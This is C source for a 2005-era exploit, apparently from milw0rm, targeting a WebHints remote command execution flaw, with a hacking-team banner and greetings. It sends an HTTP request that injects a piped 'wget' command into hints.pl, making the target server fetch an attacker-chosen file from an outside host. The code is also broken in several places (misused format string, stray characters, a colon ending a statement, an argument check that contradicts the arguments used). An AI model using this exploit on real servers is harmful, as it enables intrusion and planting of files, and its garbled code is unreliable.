/*
**************************************************************************************
*        T r a p - S e t   U n d e r g r o u n d   H a c k i n g   T e a m           *
**************************************************************************************
 EXPLOIT FOR :  WebHints Remote C0mmand Execution Vuln

Coded By: A l p h a _ P r o g r a m m e r  (Sirus-v)
E-Mail: Alpha_Programmer@Yahoo.Com

This Xpl Upload a Page in Vulnerable Directory , You can Change This Code For Yourself

**************************************************************************************
* GR33tz T0 ==>     mh_p0rtal  --  oil_Karchack  --  The-CephaleX  -- Str0ke         *
*And Iranian Security & Technical Sites:                                             *
*                                                                                    *
*         TechnoTux.Com , IranTux.Com , Iranlinux.ORG , Barnamenevis.ORG             *
*      Crouz ,  Simorgh-ev   , IHSsecurity , AlphaST , Shabgard &  GrayHatz.NeT      *
**************************************************************************************
*/
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")
#include <winsock2.h>


#define MY_PORT 80
#define BUF_LEN 256
/**************************************************************************************/
int main(int arg_c, char *arg_v[])
{
       static const char cmd[] = "GET %chints.pl?|wget %c| HTTP/1.0\r\n\r\n" , arg_v[2] , arg_v[3];

       struct sockaddr_in their_adr;
       char buf[BUF_LEN];
       struct hostent *he;
       int sock, i;
       WSADATA wsdata;

/* Winsock start up */
       WSAStartup(0x0101, &wsdata);
       atexit((void (*)(void))WSACleanup);

       if(arg_c != 3)
       {
               printf("=========================================================\n");
               printf("  Webhints Exploit By Alpha_Programmer\n");
               printf("   Trap-set Underground Hacking Team\n");
               printf("   Usage : webhints.exe [Targ3t] [DIR] [File Address]\n");
               printf("=========================================================\n");
               return 1;
       }
/* create socket */
printf("calling socket()...\n");
       sock = socket(AF_INET, SOCK_STREAM, 0);

/* get IP address of other end */
printf("calling gethostbyname()...\n");
       he = gethostbyname(arg_v[1]);
       if(he == NULL)
       {
               printf("can't get IP address of host '%s'\n", arg_v[1]);
               return 1;
       }
       memset(&their_adr, 0, sizeof(their_adr));
       their_adr.sin_family = AF_INET;
       memcpy(&their_adr.sin_addr, he->h_addr, he->h_length);
       their_adr.sin_port = htons(MY_PORT);
/* connect */
printf("C0nnecting...\n");
       i = connect(sock, (struct sockaddr *)&their_adr, sizeof(their_adr));
       if(i != 0)
       {
               printf("C0nnect() returned %d, errno=%d\n", i, errno);
               return 1;
       }
/* send H3ll C0mmand */
printf("Sending H3ll Packets...\n");
       i = send(sock, cmd, sizeof(cmd), 0);
       if(i != sizeof(cmd))
       {
               printf("Send. returned %d, errno=%d\n", i, errno);
               return 1;
       }\n
               printf("OK ... Now You Can Test your file in hints.pl Directory\n"):

       closesocket(sock);
       return 0;
}

// milw0rm.com [2005-06-11]
